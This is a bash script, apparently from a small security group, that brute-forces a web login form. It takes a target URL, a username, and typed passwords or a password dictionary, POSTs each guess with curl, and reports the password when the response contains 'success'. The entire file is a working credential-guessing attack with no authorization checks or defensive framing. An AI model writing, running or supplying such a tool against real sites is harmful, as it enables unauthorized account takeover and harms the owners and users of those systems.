#!/bin/bash

# Function to randomly pick a color (red, green, or blue)
random_color() {
    colors=("\e[31m" "\e[32m" "\e[34m")
    echo -ne "${colors[$RANDOM % ${#colors[@]}]}"
}

# Display the header with random colors
echo -e "$(random_color)MADE BY FARAZ AHMED AND CYBER VIGILANCE PK\e[0m"
echo "------------------------------------"

# Ask if the user wants to use a few specific passwords
read -p "Do you have a few passwords in mind to try first? (y/n): " use_custom

if [ "$use_custom" == "y" ]; then
    echo "Enter the passwords you want to try (type 'done' to finish):"

    custom_passwords=()
    while true; do
        read -p "Password: " password
        if [ "$password" == "done" ]; then
            break
        fi
        custom_passwords+=("$password")
    done

    echo "Using the following custom passwords first:"
    for pass in "${custom_passwords[@]}"; do
        echo $pass
    done
else
    # Prompt for the password dictionary file if not using custom passwords
    read -p "Enter the path to your password file: " password_file

    # Check if the password file exists
    if [ ! -f "$password_file" ]; then
        echo "Password file not found!"
        exit 1
    fi
fi

# Prompt for target details
read -p "Enter the target URL: " target_url
read -p "Enter the username: " username

# Function to perform brute force attack
brute_force() {
    # First try the custom passwords if provided
    if [ "$use_custom" == "y" ]; then
        for password in "${custom_passwords[@]}"; do
            echo -e "$(random_color)Trying password: $password\e[0m"
            response=$(curl -s -X POST -d "username=$username&password=$password" "$target_url")
            if [[ "$response" == *"success"* ]]; then
                echo -e "$(random_color)Password found: $password\e[0m"
                exit 0
            fi
        done
    fi

    # Then try the dictionary if provided
    if [ "$use_custom" != "y" ]; then
        while IFS= read -r password; do
            echo -e "$(random_color)Trying password: $password\e[0m"
            response=$(curl -s -X POST -d "username=$username&password=$password" "$target_url")
            if [[ "$response" == *"success"* ]]; then
                echo -e "$(random_color)Password found: $password\e[0m"
                exit 0
            fi
        done < "$password_file"
    fi

    echo -e "$(random_color)No valid password found in the list.\e[0m"
}

# Start the brute force attack
brute_force
